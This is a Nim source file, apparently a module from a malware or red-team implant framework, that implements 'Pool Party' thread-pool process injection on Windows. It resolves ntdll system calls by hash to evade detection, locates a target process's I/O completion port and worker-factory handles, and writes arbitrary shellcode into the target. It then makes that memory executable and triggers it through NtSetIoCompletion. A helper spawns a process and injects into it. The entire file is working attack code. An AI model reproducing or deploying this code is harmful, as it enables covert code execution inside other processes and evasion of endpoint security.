import winim/lean
import ../core/syscalls, ../core/resolver, ../core/utils

#[
  Pool Party Injection (TP_DIRECT)
  - Ultra Stable & Precise Version
]#

type
    FnNtQuerySystemInformation = proc(cls: ULONG, info: pointer, len: ULONG, retLen: PULONG): NTSTATUS {.stdcall.}
    FnNtDuplicateObject = proc(hSrcProc: HANDLE, hSrc: HANDLE, hTgtProc: HANDLE, hTgt: PHANDLE, access: ACCESS_MASK, attrs: ULONG, options: ULONG): NTSTATUS {.stdcall.}
    FnNtQueryInformationWorkerFactory = proc(h: HANDLE, cls: ULONG, info: pointer, len: ULONG, retLen: PULONG): NTSTATUS {.stdcall.}
    FnNtSetInformationWorkerFactory = proc(h: HANDLE, cls: ULONG, info: pointer, len: ULONG): NTSTATUS {.stdcall.}
    FnNtSetIoCompletion = proc(h: HANDLE, key: pointer, context: pointer, status: NTSTATUS, data: ULONG_PTR): NTSTATUS {.stdcall.}
    FnNtQueryObject = proc(h: HANDLE, cls: ULONG, info: pointer, len: ULONG, retLen: PULONG): NTSTATUS {.stdcall.}
    FnNtClose = proc(h: HANDLE): NTSTATUS {.stdcall.}

    TP_DIRECT = object
        Callback*: pointer
        Reserved*: pointer
    
    SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX = object
        obj*: pointer
        UniqueProcessId*: uint64
        HandleValue*: uint64
        GrantedAccess*: ULONG
        CreatorBackTraceIndex*: uint16
        ObjectTypeIndex*: uint16
        HandleAttributes*: uint32
        Reserved*: uint32

    SYSTEM_EXTENDED_HANDLE_INFORMATION = object
        NumberOfHandles*: uint64
        Reserved*: uint64

    OBJECT_TYPE_INFORMATION_STRUCT = object
        TypeName*: UNICODE_STRING
        Reserved*: array[22, uint64]

const
    SystemExtendedHandleInfoClass = 64.ULONG
    ObjectTypeInformation = 2.ULONG
    WorkerFactoryBasicInfoClass = 0.ULONG
    WorkerFactoryThreadMinimum = 4.ULONG

var 
    pNtQuerySystemInformation: FnNtQuerySystemInformation
    pNtDuplicateObject: FnNtDuplicateObject
    pNtQueryInfoWorkerFactory: FnNtQueryInformationWorkerFactory
    pNtSetInfoWorkerFactory: FnNtSetInformationWorkerFactory
    pNtSetIoCompletion: FnNtSetIoCompletion
    pNtQueryObject: FnNtQueryObject
    pNtClose: FnNtClose
    pp_apis_ready = false

proc init_pool_party_apis() =
    if pp_apis_ready: return
    let ntdll = get_module_base(hash_api("ntdll.dll"))
    pNtQuerySystemInformation = cast[FnNtQuerySystemInformation](get_proc_address_hashed(ntdll, hash_api("NtQuerySystemInformation")))
    pNtDuplicateObject = cast[FnNtDuplicateObject](get_proc_address_hashed(ntdll, hash_api("NtDuplicateObject")))
    pNtQueryInfoWorkerFactory = cast[FnNtQueryInformationWorkerFactory](get_proc_address_hashed(ntdll, hash_api("NtQueryInformationWorkerFactory")))
    pNtSetInfoWorkerFactory = cast[FnNtSetInformationWorkerFactory](get_proc_address_hashed(ntdll, hash_api("NtSetInformationWorkerFactory")))
    pNtSetIoCompletion = cast[FnNtSetIoCompletion](get_proc_address_hashed(ntdll, hash_api("NtSetIoCompletion")))
    pNtQueryObject = cast[FnNtQueryObject](get_proc_address_hashed(ntdll, hash_api("NtQueryObject")))
    pNtClose = cast[FnNtClose](get_proc_address_hashed(ntdll, hash_api("NtClose")))
    pp_apis_ready = true

# =============================================================================
#  Precise Discovery
# =============================================================================

proc find_best_pair(target_pid: DWORD, hProcess: HANDLE): (HANDLE, HANDLE) =
    var buf_size = 8 * 1024 * 1024.SIZE_T
    var hMem = GlobalAlloc(GPTR, buf_size)
    if hMem == 0: return (0.HANDLE, 0.HANDLE)
    var buf = cast[pointer](hMem)
    var ret_len: ULONG
    var status = pNtQuerySystemInformation(SystemExtendedHandleInfoClass, buf, buf_size.ULONG, addr ret_len)
    
    var best_iocp: HANDLE = 0
    var best_wf: HANDLE = 0

    if status == 0:
        let handle_info = cast[ptr SYSTEM_EXTENDED_HANDLE_INFORMATION](buf)
        let entries = cast[ptr UncheckedArray[SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX]](cast[uint](handle_info) + 16.uint)
        let current_process = cast[HANDLE](-1)
        
        var t_iocps: array[512, HANDLE]; var t_ic = 0
        var t_wfs: array[256, HANDLE]; var t_wc = 0
        let sIo = newWideCString("IoCompletion")
        let sW1 = newWideCString("WorkerFactory")
        let sW2 = newWideCString("TpWorkerFactory")

        for i in 0..<handle_info.NumberOfHandles.int:
            let entry = entries[i]
            if entry.UniqueProcessId != target_pid.uint64: continue
            var dup: HANDLE = 0
            if pNtDuplicateObject(hProcess, cast[HANDLE](entry.HandleValue), current_process, addr dup, 0, 0, 0x2) == 0:
                var t_buf: array[512, byte]
                if pNtQueryObject != nil and pNtQueryObject(dup, ObjectTypeInformation, addr t_buf[0], 512, nil) == 0:
                    let pName = cast[ptr OBJECT_TYPE_INFORMATION_STRUCT](addr t_buf[0]).TypeName.Buffer
                    if lstrcmpiW(pName, sIo) == 0:
                        if t_ic < 512: (t_iocps[t_ic] = cast[HANDLE](entry.HandleValue); t_ic += 1)
                    elif lstrcmpiW(pName, sW1) == 0 or lstrcmpiW(pName, sW2) == 0:
                        if t_wc < 256: (t_wfs[t_wc] = cast[HANDLE](entry.HandleValue); t_wc += 1)
                discard pNtClose(dup)

        # Pair Discovery - Find the closest related handles
        var min_dist: uint = 999999
        for i in 0..<t_wc:
            let wv = cast[uint](t_wfs[i])
            for j in 0..<t_ic:
                let iv = cast[uint](t_iocps[j])
                let d = if wv > iv: wv - iv else: iv - wv
                if d < min_dist:
                    min_dist = d
                    best_wf = t_wfs[i]
                    best_iocp = t_iocps[j]
                    if d <= 12: break # Typically handles are created together
            if min_dist <= 12: break

    discard GlobalFree(hMem)
    return (best_iocp, best_wf)

# =============================================================================
#  Injection
# =============================================================================

proc pool_party_inject*(target_pid: DWORD, shellcode: openArray[byte]): bool =
    init_pool_party_apis()
    if pNtQuerySystemInformation == nil: return false
    var hProcess: HANDLE = 0
    var cid: CLIENT_ID; cid.UniqueProcess = cast[HANDLE](target_pid)
    var oa: OBJECT_ATTRIBUTES; oa.Length = sizeof(oa).ULONG
    if NtOpenProcess(addr hProcess, PROCESS_ALL_ACCESS, addr oa, addr cid) != 0: return false
    
    let (iocp, wf) = find_best_pair(target_pid, hProcess)
    if iocp == 0 or wf == 0:
        discard pNtClose(hProcess); return false
    
    # Payload Setup with Fire-and-Forget Wrapper
    # 48 83 EC 28 (sub rsp, 40) + shellcode + 48 83 C4 28 (add rsp, 40) + C3 (ret)
    var sc_len = shellcode.len + 9
    var sc_mem = cast[ptr UncheckedArray[byte]](alloc(sc_len))
    sc_mem[0]=0x48; sc_mem[1]=0x83; sc_mem[2]=0xEC; sc_mem[3]=0x28
    for i in 0..<shellcode.len: sc_mem[i+4] = shellcode[i]
    sc_mem[sc_len-5]=0x48; sc_mem[sc_len-4]=0x83; sc_mem[sc_len-3]=0xC4; sc_mem[sc_len-2]=0x28; sc_mem[sc_len-1]=0xC3
    
    var sc_addr: pointer = nil; var sc_size = sc_len.SIZE_T
    discard NtAllocateVirtualMemory(hProcess, addr sc_addr, 0, addr sc_size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    var written: SIZE_T
    discard NtWriteVirtualMemory(hProcess, sc_addr, sc_mem, sc_size, addr written)
    var old: ULONG; var b = sc_addr; var s = sc_size
    discard NtProtectVirtualMemory(hProcess, addr b, addr s, PAGE_EXECUTE_READ, addr old)
    dealloc(sc_mem)
    
    var tp: TP_DIRECT; tp.Callback = sc_addr
    var tp_addr: pointer = nil; var tp_size = sizeof(tp).SIZE_T
    discard NtAllocateVirtualMemory(hProcess, addr tp_addr, 0, addr tp_size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    discard NtWriteVirtualMemory(hProcess, tp_addr, addr tp, tp_size, addr written)
    
    # Execution
    var ok = false; let curr = cast[HANDLE](-1)
    var loc_iocp, loc_wf: HANDLE = 0
    if pNtDuplicateObject(hProcess, iocp, curr, addr loc_iocp, 0, 0, 0x2) == 0:
        if pNtDuplicateObject(hProcess, wf, curr, addr loc_wf, 0, 0, 0x2) == 0:
            # Post one packet only to avoid saturation
            if pNtSetIoCompletion(loc_iocp, nil, tp_addr, 0, 0) == 0:
                # Nudge once
                var m: ULONG = 1
                discard pNtSetInfoWorkerFactory(loc_wf, WorkerFactoryThreadMinimum, addr m, 4)
                ok = true
            discard pNtClose(loc_wf)
        discard pNtClose(loc_iocp)

    discard pNtClose(hProcess)
    return ok

proc pool_party_spawn*(cmd: string, shellcode: openArray[byte]): bool =
    var pi: PROCESS_INFORMATION; var si: STARTUPINFO; si.cb = sizeof(si).DWORD
    var wCmd = newWideCString(cmd)
    if CreateProcessW(nil, cast[LPWSTR](addr wCmd[0]), nil, nil, FALSE, 0, nil, nil, addr si, addr pi) == 0: return false
    discard pool_party_inject(pi.dwProcessId, shellcode)
    discard pNtClose(pi.hProcess); discard pNtClose(pi.hThread)
    return true
